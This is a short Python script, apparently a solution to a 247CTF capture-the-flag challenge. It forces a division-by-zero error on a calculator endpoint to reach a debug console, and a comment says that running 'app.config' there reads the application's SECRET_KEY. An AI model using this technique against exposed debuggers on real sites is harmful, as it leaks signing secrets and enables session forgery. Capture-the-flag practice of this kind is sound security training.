import requests

# https://ad435e9d2f36de53.247ctf.com/calculator?number_1=1&number_2=0&operation=%2F
# in debug console, run the following to read 'SECRET_KEY':
# >>> app.config

response = requests.get(
    'https://ad435e9d2f36de53.247ctf.com/calculator',
    params={'number_1': 2, 'number_2': 0, 'operation': '/'},
)

print(response.text)